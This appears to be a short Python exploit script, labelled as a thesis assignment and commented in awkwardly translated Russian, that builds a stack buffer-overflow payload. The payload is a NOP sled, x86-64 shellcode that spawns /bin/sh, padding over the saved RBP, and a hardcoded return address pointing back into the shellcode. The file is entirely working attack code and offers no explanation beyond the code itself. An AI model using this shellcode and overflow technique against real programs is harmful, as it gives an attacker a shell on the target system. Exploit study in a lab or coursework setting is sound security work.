#!/usr/bin/python3
#   Автор   : Abdellah Oulahyane
#   Код цели: Дипломное задание

import sys
import struct as s

exploit  = b'\x90'*20                               # отрегулировать штабель 
exploit += b"\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6"  # шеллкод
exploit += b"\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f"  # шеллкод
exploit += b"\x73\x68\x53\x48\x89\xe7\x48\x83\xc0"  # шеллкод
exploit += b"\x3b\x0f\x05"                          # шеллкод
exploit += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"  # шеллкод
exploit += b"\x90" * (128 - len(exploit))           # заполнить стек до РБП
exploit += b"\x90" * 8                              # заполнить РБП
exploit += s.pack('Q', 0x7fffffffde60)              # обратный адрес перезаписывается 
                                                    # адресом места, где находится шеллкод
sys.stdout.buffer.write(exploit)                    # полная полезная нагрузка эксплойта





